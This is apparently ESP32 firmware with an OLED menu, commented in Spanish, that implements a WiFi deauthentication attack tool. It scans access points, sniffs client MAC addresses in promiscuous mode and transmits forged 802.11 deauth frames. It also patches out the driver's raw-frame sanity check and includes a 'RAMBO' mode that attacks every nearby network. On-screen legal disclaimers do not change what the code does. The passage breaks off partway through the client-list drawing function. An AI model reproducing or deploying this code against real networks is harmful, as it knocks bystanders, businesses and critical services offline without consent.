#include "Deauther.h"
#include <WiFi.h>
#include <U8g2lib.h>
#include "esp_wifi.h"

#include "app_config.h"
#include "ui_theme.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

#define BTN_UP AppConfig::BTN_UP
#define BTN_DOWN AppConfig::BTN_DOWN
#define BTN_OK AppConfig::BTN_OK
#define BTN_BACK AppConfig::BTN_BACK
#define BTN_AUX AppConfig::BTN_AUX

constexpr uint16_t TFT_BLACK  = 0;
constexpr uint16_t UI_BG      = 0;
constexpr uint16_t TFT_RED    = 1;
constexpr uint16_t TFT_GREEN  = 1;
constexpr uint16_t TFT_YELLOW = 1;
constexpr uint16_t TFT_ORANGE = 1;
constexpr uint16_t TFT_CYAN   = 1;
constexpr uint16_t UI_MAIN    = 1;
constexpr uint16_t UI_ACCENT  = 1;
constexpr uint16_t UI_SELECT  = 1;

static int oledX(int x) {
    return constrain((x * AppConfig::SCREEN_W) / 320, 0, AppConfig::SCREEN_W - 1);
}

static int oledY(int y) {
    return constrain((y * AppConfig::SCREEN_H) / 240, 0, AppConfig::SCREEN_H - 1);
}

static int oledW(int w) {
    return max(1, (w * AppConfig::SCREEN_W) / 320);
}

static int oledH(int h) {
    return max(1, (h * AppConfig::SCREEN_H) / 240);
}

class OledTftCompat {
public:
    void fillScreen(uint16_t color) {
        if (color == TFT_BLACK) {
            u8g2.clearBuffer();
        } else {
            u8g2.setDrawColor(1);
            u8g2.drawBox(0, 0, AppConfig::SCREEN_W, AppConfig::SCREEN_H);
        }
        u8g2.sendBuffer();
    }

    void drawRect(int x, int y, int w, int h, uint16_t color) {
        u8g2.setDrawColor(color ? 1 : 0);
        u8g2.drawFrame(oledX(x), oledY(y), oledW(w), oledH(h));
        u8g2.setDrawColor(1);
        u8g2.sendBuffer();
    }

    void fillRect(int x, int y, int w, int h, uint16_t color) {
        u8g2.setDrawColor(color ? 1 : 0);
        u8g2.drawBox(oledX(x), oledY(y), oledW(w), oledH(h));
        u8g2.setDrawColor(1);
        u8g2.sendBuffer();
    }

    void drawFastHLine(int x, int y, int w, uint16_t color) {
        u8g2.setDrawColor(color ? 1 : 0);
        u8g2.drawHLine(oledX(x), oledY(y), oledW(w));
        u8g2.setDrawColor(1);
        u8g2.sendBuffer();
    }
};

static OledTftCompat tft;

static void selectFont(uint8_t size) {
    if (size >= 2) {
        u8g2.setFont(u8g2_font_6x12_tr);
    } else {
        u8g2.setFont(u8g2_font_5x7_tr);
    }
}

static int fontHeight(uint8_t size) {
    return size >= 2 ? 10 : 7;
}

static int getTextWidth(const String& text, uint8_t size) {
    selectFont(size);
    return (u8g2.getStrWidth(text.c_str()) * 320) / AppConfig::SCREEN_W;
}

static void drawStringCustom(int x, int y, const String& text, uint16_t color, uint8_t size) {
    selectFont(size);
    u8g2.setDrawColor(color ? 1 : 0);
    u8g2.drawStr(oledX(x), min<int>(AppConfig::SCREEN_H - 1, oledY(y) + fontHeight(size)), text.c_str());
    u8g2.setDrawColor(1);
    u8g2.sendBuffer();
}

static void drawStringBig(int x, int y, const String& text, uint16_t color, uint8_t size) {
    drawStringCustom(x, y, text, color, size >= 2 ? 2 : 1);
}

static void drawStringFit(int x, int y, const String& text, uint16_t color, int maxWidth, uint8_t size) {
    String clipped = text;
    selectFont(size);
    int maxPx = oledW(maxWidth);
    while (clipped.length() > 0 && u8g2.getStrWidth(clipped.c_str()) > maxPx) {
        clipped.remove(clipped.length() - 1);
    }
    if (clipped.length() < text.length() && clipped.length() > 2) {
        clipped.remove(clipped.length() - 2);
        clipped += "..";
    }
    drawStringCustom(x, y, clipped, color, size);
}

static void beep(uint16_t freq, uint16_t durationMs) {
    (void)freq;
    delay(durationMs);
}

static bool waitOkReleaseWasLong() {
    unsigned long start = millis();
    while (digitalRead(BTN_OK) == LOW) {
        delay(5);
    }
    return millis() - start >= AppConfig::INPUT_LONG_PRESS_MS;
}

static bool pressedPin(uint8_t pin) {
    return digitalRead(pin) == LOW;
}

static void waitRelease(uint8_t pin) {
    while (digitalRead(pin) == LOW) delay(5);
    delay(80);
}

static String fitOledText(String text, int maxPx) {
    u8g2.setFont(u8g2_font_5x7_tr);
    while (text.length() > 0 && u8g2.getStrWidth(text.c_str()) > maxPx) {
        text.remove(text.length() - 1);
    }
    if (text.length() > 2 && u8g2.getStrWidth(text.c_str()) > maxPx - 8) {
        text.remove(text.length() - 2);
        text += "..";
    }
    return text;
}

static void drawOledHeader(const char* title, const char* status = nullptr) {
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, title, status);
}

static void drawOledFooter(const char* hint) {
    u8g2.drawHLine(0, 55, 128);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(2, 63, hint);
}

static void drawOledRow(int y, bool selected, const String& title, const String& meta = "") {
    if (selected) {
        u8g2.drawBox(0, y - 7, 128, 10);
        u8g2.setDrawColor(0);
    }

    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(3, y, fitOledText(title, meta.length() ? 88 : 122).c_str());
    if (meta.length()) {
        int metaW = u8g2.getStrWidth(meta.c_str());
        u8g2.drawStr(max(94, 125 - metaW), y, meta.c_str());
    }

    if (selected) u8g2.setDrawColor(1);
}

static void drawOledMessage(const char* title, const char* line1, const char* line2, const char* hint) {
    drawOledHeader(title);
    u8g2.setFont(u8g2_font_5x7_tr);
    if (line1) u8g2.drawStr(4, 28, line1);
    if (line2) u8g2.drawStr(4, 39, line2);
    drawOledFooter(hint);
    u8g2.sendBuffer();
}

static void drawScanProgress(const char* title, int percent, int found, const String& detail) {
    char status[8];
    snprintf(status, sizeof(status), "%3d%%", constrain(percent, 0, 100));
    drawOledHeader(title, status);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(4, 27, fitOledText(detail, 120).c_str());
    char count[20];
    snprintf(count, sizeof(count), "Encontrados: %d", found);
    u8g2.drawStr(4, 39, count);
    UiTheme::drawProgressBar(u8g2, 8, 48, 112, 7, percent);
    u8g2.sendBuffer();
}

// ═══════════════════════════════════════════════════════════════════════════
//  PATCH · anula la validacion de frames 802.11
//  Este override solo funciona si se aplico el comando objcopy --weaken-symbol
//  sobre libnet80211.a
// ═══════════════════════════════════════════════════════════════════════════
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
                                                 int32_t arg2,
                                                 int32_t arg3) {
    return 0;   // siempre permitir
}

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIGURACIÓN
// ═══════════════════════════════════════════════════════════════════════════
#define MAX_APS             30
#define MAX_CLIENTS         15
#define VISIBLE_ROWS        4
#define AP_SCAN_TIME_S      10
#define CLIENT_SCAN_TIME_S  15

// ═══════════════════════════════════════════════════════════════════════════
//  ESTRUCTURAS
// ═══════════════════════════════════════════════════════════════════════════
struct APInfo {
    String   ssid;
    uint8_t  bssid[6];
    int      channel;
    int      rssi;
    String   bssidStr;
};

struct ClientInfo {
    uint8_t  mac[6];
    String   macStr;
    int      rssi;
    unsigned long lastSeen;
};

static APInfo     aps[MAX_APS];
static int        apCount = 0;
static ClientInfo clients[MAX_CLIENTS];
static int        clientCount = 0;

// Estado del ataque
static volatile unsigned long deauthPackets = 0;
static APInfo     activeAP;
static uint8_t    activeTargetMac[6];
static bool       broadcastMode = false;    // true = todos los clientes del AP
static bool       ramboMode     = false;    // true = TODAS las APs (channel hop)

// ═══════════════════════════════════════════════════════════════════════════
//  DEAUTH FRAME TEMPLATE
//  Frame Control: type=Management (0x00), subtype=Deauthentication (0x0C)
//  → primer byte = 0xC0 (subtype deauth + management)
// ═══════════════════════════════════════════════════════════════════════════
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                          // Frame Control: deauth
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (se llena dinámico)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (BSSID del AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (del AP)
    0x00, 0x00,                          // Sequence
    0x07, 0x00                           // Reason code 7 = Class 3 frame
};

// ═══════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════════════

// Formatea 6 bytes como "AA:BB:CC:DD:EE:FF"
static String macToStr(const uint8_t mac[6]) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static int rssiBars(int rssi) {
    if (rssi >= -55) return 4;
    if (rssi >= -70) return 3;
    if (rssi >= -85) return 2;
    if (rssi >= -95) return 1;
    return 0;
}

static String formatTime(unsigned long ms) {
    unsigned long s = ms / 1000;
    unsigned long h = s / 3600;
    unsigned long m = (s % 3600) / 60;
    unsigned long sec = s % 60;
    char buf[12];
    snprintf(buf, sizeof(buf), "%02lu:%02lu:%02lu", h, m, sec);
    return String(buf);
}

// Envía 1 deauth frame con el target, BSSID y reason especificados
static void sendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
    memcpy(&deauthFrame[4],  target, 6);   // destination
    memcpy(&deauthFrame[10], bssid,  6);   // source (BSSID)
    memcpy(&deauthFrame[16], bssid,  6);   // BSSID
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    deauthPackets++;
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER REFORZADO
// ═══════════════════════════════════════════════════════════════════════════
static bool showDisclaimer() {
    drawOledHeader("DEAUTHER", "AVISO");
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(4, 24, "Solo redes propias");
    u8g2.drawStr(4, 34, "o con permiso.");
    u8g2.drawStr(4, 45, "Uso ajeno es ilegal.");
    drawOledFooter("OK acepta  BACK sale");
    u8g2.sendBuffer();

    while (true) {
        if (pressedPin(BTN_OK)) {
            beep(2200, 60);
            waitRelease(BTN_OK);
            return true;
        }
        if (pressedPin(BTN_BACK)) {
            beep(800, 100);
            waitRelease(BTN_BACK);
            return false;
        }
        delay(20);
    }

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawStringBig(70, 8, "DEAUTHER", TFT_RED, 2);
    tft.drawFastHLine(0, 46, 320, TFT_RED);

    int y = 54;
    drawStringCustom(10, y, "Esta herramienta desconecta",   UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "dispositivos de su red WiFi.",  UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "USO LEGAL:",                     TFT_GREEN, 1); y += 12;
    drawStringCustom(20, y, "- Tu red propia",                UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Red con permiso del dueño",    UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "USO ILEGAL:",                    TFT_RED, 1); y += 12;
    drawStringCustom(20, y, "- Redes ajenas sin permiso",     UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Servicios criticos / medicos", UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Empresas / gobierno",          UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Violacion = delito federal.",    TFT_RED, 1);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK: ENTIENDO   UP/DN: SALIR",  UI_ACCENT, 1);

    while (true) {
        if (digitalRead(BTN_OK) == LOW) {
            beep(2200, 60);
            while (digitalRead(BTN_OK) == LOW) delay(5);
            delay(100);
            return true;
        }
        if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
            beep(800, 100);
            while (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW)
                delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SCAN DE APs
// ═══════════════════════════════════════════════════════════════════════════
static void scanAPs() {
    apCount = 0;

    drawScanProgress("SCAN AP", 0, 0, String(AP_SCAN_TIME_S) + "s buscando redes");

    // WiFi scan estándar (modo STA)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Scan asíncrono
    WiFi.scanNetworks(true, true);   // async, show_hidden

    unsigned long scanStart = millis();
    int lastCount = 0;

    while (millis() - scanStart < AP_SCAN_TIME_S * 1000UL) {
        int status = WiFi.scanComplete();
        if (status >= 0 && status != lastCount) {
            lastCount = status;
        }

        int progress = (int)(((millis() - scanStart) * 100UL) / (AP_SCAN_TIME_S * 1000UL));
        drawScanProgress("SCAN AP", progress, lastCount, "Escaneando WiFi...");

        delay(100);
    }

    // Esperar a que termine si aún está corriendo
    int n = WiFi.scanComplete();
    while (n == WIFI_SCAN_RUNNING) {
        delay(100);
        n = WiFi.scanComplete();
    }

    if (n < 0) n = 0;
    if (n > MAX_APS) n = MAX_APS;

    // Copiar resultados
    for (int i = 0; i < n; i++) {
        aps[i].ssid    = WiFi.SSID(i);
        aps[i].rssi    = WiFi.RSSI(i);
        aps[i].channel = WiFi.channel(i);

        uint8_t* b = WiFi.BSSID(i);
        if (b) {
            memcpy(aps[i].bssid, b, 6);
            aps[i].bssidStr = macToStr(aps[i].bssid);
        }

        if (aps[i].ssid.length() == 0) aps[i].ssid = "<hidden>";
    }
    apCount = n;

    WiFi.scanDelete();

    // Ordenar por RSSI desc
    for (int i = 0; i < apCount - 1; i++) {
        for (int j = 0; j < apCount - 1 - i; j++) {
            if (aps[j].rssi < aps[j + 1].rssi) {
                APInfo tmp = aps[j];
                aps[j] = aps[j + 1];
                aps[j + 1] = tmp;
            }
        }
    }

    beep(2000, 40);
    delay(20);
    beep(2400, 60);
}

// ═══════════════════════════════════════════════════════════════════════════
//  SELECCIÓN DE AP (+ Rambo + Rescan + Back)
// ═══════════════════════════════════════════════════════════════════════════
static void drawAPList(int cursor, int scrollOffset) {
    {
    int totalItems = apCount + 2;
    char status[10];
    snprintf(status, sizeof(status), "%02d/%02d", cursor + 1, totalItems);
    drawOledHeader("SELECT AP", status);

    for (int i = 0; i < VISIBLE_ROWS; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        String title;
        String meta;
        if (idx == 0) {
            title = "RAMBO: ALL APs";
            meta = "WARN";
        } else if (idx == apCount + 1) {
            title = "< RESCAN";
        } else {
            APInfo& a = aps[idx - 1];
            title = a.ssid;
            meta = "CH" + String(a.channel);
        }
        drawOledRow(24 + i * 10, idx == cursor, title, meta);
    }

    drawOledFooter("OK sel BK out AX res");
    u8g2.sendBuffer();
    return;
    }

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "SELECT AP", UI_MAIN, 1);
    drawStringCustom(230, 12, "[" + String(apCount) + " APs]", UI_ACCENT, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // Items: RAMBO (0), APs (1..apCount), RESCAN, BACK
    int totalItems = apCount + 2;
    const int rowH = 32;
    const int listY = 36;

    for (int i = 0; i < VISIBLE_ROWS; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        int y = listY + i * rowH;
        bool selected = (idx == cursor);

        if (selected) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);

        uint16_t colMain = selected ? UI_BG : UI_MAIN;
        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;

        if (idx == 0) {
            // RAMBO MODE
            drawStringCustom(10, y + 6,  "[!] RAMBO: ATTACK ALL APs",
                             selected ? UI_BG : TFT_RED, 2);
            drawStringCustom(10, y + 20, "Agresivo - ver disclaimer",
                             colSub, 1);
        } else if (idx == apCount + 1) {
            drawStringCustom(10, y + 10, "< RESCAN", colMain, 2);
        } else {
            int apIdx = idx - 1;
            APInfo& a = aps[apIdx];

            String s = a.ssid;
            if (getTextWidth(s, 2) <= 260) {
                drawStringCustom(10, y + 4, s, colMain, 2);
            } else {
                drawStringFit(10, y + 8, s, colMain, 260, 1);
            }

            String meta = "CH" + String(a.channel) + " " +
                          String(a.rssi) + "dBm";
            drawStringCustom(10, y + 20, meta, colSub, 1);

            // Bars
            int bars = rssiBars(a.rssi);
            int bx = 285, by = 24;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t c = (b < bars)
                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (selected ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
            }
        }
    }

    // Scroll bar
    if (totalItems > VISIBLE_ROWS) {
        int barH = (VISIBLE_ROWS * 176) / totalItems;
        int barY = 36 + (scrollOffset * (176 - barH)) / (totalItems - VISIBLE_ROWS);
        tft.fillRect(314, barY, 4, barH, UI_ACCENT);
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:SELECT  OK(HOLD):BACK", UI_ACCENT, 1);
}

// Devuelve:
//   -3 = BACK, -2 = RESCAN, -1 = RAMBO, 0..apCount-1 = AP index
static int selectAP() {
    int cursor = 1;   // iniciar en el primer AP real, no en RAMBO
    int scrollOffset = 0;
    int totalItems = apCount + 2;

    drawAPList(cursor, scrollOffset);

    while (true) {
        if (pressedPin(BTN_UP)) {
            cursor = (cursor - 1 + totalItems) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawAPList(cursor, scrollOffset);
            delay(180);
        }
        if (pressedPin(BTN_DOWN)) {
            cursor = (cursor + 1) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawAPList(cursor, scrollOffset);
            delay(180);
        }
        if (pressedPin(BTN_BACK)) {
            beep(1000, 40);
            waitRelease(BTN_BACK);
            return -3;
        }
        if (pressedPin(BTN_AUX)) {
            beep(1500, 40);
            waitRelease(BTN_AUX);
            return -2;
        }
        if (pressedPin(BTN_OK)) {
            beep(1800, 40);
            waitRelease(BTN_OK);
            if (cursor == 0)              return -1;   // RAMBO
            if (cursor == apCount + 1)    return -2;   // RESCAN
            return cursor - 1;                          // índice AP real
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  RAMBO DISCLAIMER (extra warning)
// ═══════════════════════════════════════════════════════════════════════════
static bool confirmRambo() {
    drawOledHeader("RAMBO MODE", "WARN");
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(4, 24, "Ataca todas las APs");
    u8g2.drawStr(4, 34, "detectadas.");
    u8g2.drawStr(4, 45, "Responsabilidad tuya.");
    drawOledFooter("OK sigue  BACK canc");
    u8g2.sendBuffer();

    while (true) {
        if (pressedPin(BTN_OK)) {
            beep(2200, 60);
            waitRelease(BTN_OK);
            return true;
        }
        if (pressedPin(BTN_BACK)) {
            beep(800, 100);
            waitRelease(BTN_BACK);
            return false;
        }
        delay(20);
    }

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawStringBig(60, 10, "RAMBO MODE", TFT_RED, 2);
    tft.drawFastHLine(0, 48, 320, TFT_RED);

    int y = 58;
    drawStringCustom(10, y, "Atacara TODAS las redes WiFi",   UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "cercanas simultaneamente.",       UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Rota canales 1, 6 y 11.",         UI_ACCENT, 1); y += 20;

    drawStringCustom(10, y, "!! ESTO AFECTA A TERCEROS !!",    TFT_RED, 1); y += 12;
    drawStringCustom(10, y, "!! VECINOS, OFICINAS, ETC !!",    TFT_RED, 1); y += 20;

    drawStringCustom(10, y, "Solo usar en tu propio",          UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "espacio fisico aislado.",         UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Responsabilidad 100% tuya.",      TFT_YELLOW, 1);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK: CONTINUAR   UP/DN: CANCEL", UI_ACCENT, 1);

    while (true) {
        if (digitalRead(BTN_OK) == LOW) {
            beep(2200, 60);
            while (digitalRead(BTN_OK) == LOW) delay(5);
            delay(100);
            return true;
        }
        if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
            beep(800, 100);
            while (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW)
                delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MENÚ DE ACCIÓN (después de seleccionar AP)
//  Broadcast now | Scan clients | Back
// ═══════════════════════════════════════════════════════════════════════════
static void drawActionMenu(int cursor, const APInfo& ap) {
    {
    drawOledHeader("ACTION", "AP");
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(3, 24, fitOledText(ap.ssid, 122).c_str());
    String meta = "CH" + String(ap.channel) + " " + String(ap.rssi) + "dBm";
    u8g2.drawStr(3, 34, meta.c_str());
    drawOledRow(47, cursor == 0, "Broadcast NOW");
    drawOledRow(57, cursor == 1, "Scan clients");
    u8g2.drawStr(91, 63, "BK out");
    u8g2.sendBuffer();
    return;
    }

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "ACTION", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // AP info
    drawStringFit(10, 38, "AP: " + ap.ssid, UI_SELECT, 300, 1);
    drawStringCustom(10, 50, "BSSID: " + ap.bssidStr, UI_ACCENT, 1);
    drawStringCustom(10, 62, "Channel: " + String(ap.channel) + "  RSSI: " +
                     String(ap.rssi) + "dBm", UI_ACCENT, 1);
    tft.drawFastHLine(0, 75, 320, UI_ACCENT);

    // 3 opciones
    const char* items[] = {
        "Broadcast Deauth NOW",
        "Scan Clients (15s)"
    };
    const char* descs[] = {
        "Desconecta a todos",
        "Selecciona target fino",
        ""
    };

    for (int i = 0; i < 2; i++) {
        int y = 85 + i * 32;
        bool selected = (i == cursor);

        if (selected) tft.fillRect(5, y - 2, 310, 28, UI_SELECT);

        uint16_t colMain = selected ? UI_BG : UI_MAIN;
        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;

        drawStringCustom(15, y + 2,  items[i], colMain, 2);
        if (strlen(descs[i]) > 0) {
            drawStringCustom(15, y + 18, descs[i], colSub, 1);
        }
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:SELECT  OK(HOLD):BACK", UI_ACCENT, 1);
}

// Devuelve: 0=broadcast, 1=scan clients, -1=back
static int selectAction(const APInfo& ap) {
    int cursor = 0;
    drawActionMenu(cursor, ap);

    while (true) {
        if (pressedPin(BTN_UP)) {
            cursor = (cursor - 1 + 2) % 2;
            beep(2100, 20);
            drawActionMenu(cursor, ap);
            delay(180);
        }
        if (pressedPin(BTN_DOWN)) {
            cursor = (cursor + 1) % 2;
            beep(2100, 20);
            drawActionMenu(cursor, ap);
            delay(180);
        }
        if (pressedPin(BTN_BACK)) {
            beep(1000, 40);
            waitRelease(BTN_BACK);
            return -1;
        }
        if (pressedPin(BTN_AUX)) {
            cursor = 1;
            beep(1500, 40);
            drawActionMenu(cursor, ap);
            waitRelease(BTN_AUX);
        }
        if (pressedPin(BTN_OK)) {
            beep(1800, 40);
            waitRelease(BTN_OK);
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SCAN DE CLIENTES (modo promiscuo filtrando por BSSID del AP)
// ═══════════════════════════════════════════════════════════════════════════
static uint8_t scanTargetBSSID[6];

static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    if (clientCount >= MAX_CLIENTS) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;

    // En frames data:
    //   bytes 4-9   = destination (addr1)
    //   bytes 10-15 = source (addr2)
    //   bytes 16-21 = BSSID (addr3)
    // Los clientes son dispositivos donde su MAC aparece como src/dst
    // y el BSSID coincide con el AP target

    uint8_t* addr1 = &payload[4];
    uint8_t* addr2 = &payload[10];
    uint8_t* addr3 = &payload[16];

    uint8_t* clientMac = nullptr;

    // Frame del cliente al AP (addr3 = BSSID = AP, addr2 = cliente)
    if (memcmp(addr3, scanTargetBSSID, 6) == 0 &&
        memcmp(addr2, scanTargetBSSID, 6) != 0) {
        clientMac = addr2;
    }
    // Frame del AP al cliente (addr2 = AP, addr1 = cliente)
    else if (memcmp(addr2, scanTargetBSSID, 6) == 0 &&
             memcmp(addr1, scanTargetBSSID, 6) != 0 &&
             addr1[0] != 0xFF) {  // no broadcast
        clientMac = addr1;
    }

    if (!clientMac) return;

    // Filtrar multicast
    if (clientMac[0] & 0x01) return;

    // Buscar si ya está
    for (int i = 0; i < clientCount; i++) {
        if (memcmp(clients[i].mac, clientMac, 6) == 0) {
            clients[i].rssi = pkt->rx_ctrl.rssi;
            clients[i].lastSeen = millis();
            return;
        }
    }

    // Agregar nuevo
    memcpy(clients[clientCount].mac, clientMac, 6);
    clients[clientCount].macStr = macToStr(clientMac);
    clients[clientCount].rssi   = pkt->rx_ctrl.rssi;
    clients[clientCount].lastSeen = millis();
    clientCount++;
}

static void scanClients(const APInfo& ap) {
    clientCount = 0;
    memcpy(scanTargetBSSID, ap.bssid, 6);

    drawScanProgress("CLIENTS", 0, 0, "AP: " + ap.ssid);

    // Setup promiscuous mode en el canal del AP
    WiFi.mode(WIFI_MODE_NULL);
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&clientSnifferCallback);

    unsigned long scanStart = millis();
    int lastDrawnCount = -1;
    int barX = 10, barY = 80, barW = 300, barH = 14;

    while (millis() - scanStart < CLIENT_SCAN_TIME_S * 1000UL) {
        int oledProgress = (int)(((millis() - scanStart) * 100UL) / (CLIENT_SCAN_TIME_S * 1000UL));
        if (clientCount != lastDrawnCount || (millis() / 500) % 2 == 0) {
            drawScanProgress("CLIENTS", oledProgress, clientCount, "AP: " + ap.ssid);
            lastDrawnCount = clientCount;
        }
        delay(150);
        continue;

        float progress = (float)(millis() - scanStart) /
                         (CLIENT_SCAN_TIME_S * 1000.0f);
        int fillW = (int)((barW - 2) * progress);
        tft.fillRect(barX + 1, barY + 1, fillW, barH - 2, UI_SELECT);

        // Redibujar lista de clientes si cambió
        if (clientCount != lastDrawnCount) {
            tft.fillRect(10, 105, 300, 100, TFT_BLACK);
            drawStringCustom(10, 105, "Clients: " + String(clientCount),
                             TFT_GREEN, 2);

            int yy = 125;
            int show = clientCount;
            if (show > 5) show = 5;
            for (int i = 0; i < show; i++) {
                String line = "- " + clients[i].macStr +
                              " (" + String(clients[i].rssi) + ")";
                drawStringCustom(10, yy, line, UI_ACCENT, 1);
                yy += 12;
            }
            if (clientCount > 5) {
                drawStringCustom(10, yy, "...+" + String(clientCount - 5) +
                                 " more", UI_ACCENT, 1);
            }

            lastDrawnCount = clientCount;
        }

        delay(150);
    }

    // Cleanup
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    // Ordenar por RSSI desc
    for (int i = 0; i < clientCount - 1; i++) {
        for (int j = 0; j < clientCount - 1 - i; j++) {
            if (clients[j].rssi < clients[j + 1].rssi) {
                ClientInfo tmp = clients[j];
                clients[j] = clients[j + 1];
                clients[j + 1] = tmp;
            }
        }
    }

    beep(2000, 40);
    delay(20);
    beep(2400, 60);
}

// ═══════════════════════════════════════════════════════════════════════════
//  SELECCIÓN DE TARGET (cliente o ALL)
// ═══════════════════════════════════════════════════════════════════════════
static void drawClientList(int cursor, int scrollOffset) {
    {
    int totalItems = clientCount + 2;
    char status[10];
    snprintf(status, sizeof(status), "%02d/%02d", cursor + 1, totalItems);
    drawOledHeader("TARGET", status);

    for (int i = 0; i < VISIBLE_ROWS; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        String title;
        String meta;
        if (idx == 0) {
            title = "ALL CLIENTS";
        } else if (idx == clientCount + 1) {
            title = "< RESCAN";
        } else {
            ClientInfo& c = clients[idx - 1];
            title = c.macStr;
            meta = String(c.rssi) + "dB";
        }
        drawOledRow(24 + i * 10, idx == cursor, title, meta);
    }

    drawOledFooter("OK sel BK out AX res");
    u8g2.sendBuffer();
    return;
    }

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "SELECT TARGET", UI_MAIN, 1);
    drawStringCustom(230, 12, "[" + String(clientCount) + " clients]",
                     UI_ACCENT, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // Items: ALL_CLIENTS (0), clients (1..clientCount), RESCAN
    int totalItems = clientCount + 2;
    const int rowH = 28;
    const int listY = 36;

    for (int i = 0; i < VISIBLE_ROWS + 1; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        int y = listY + i * rowH;
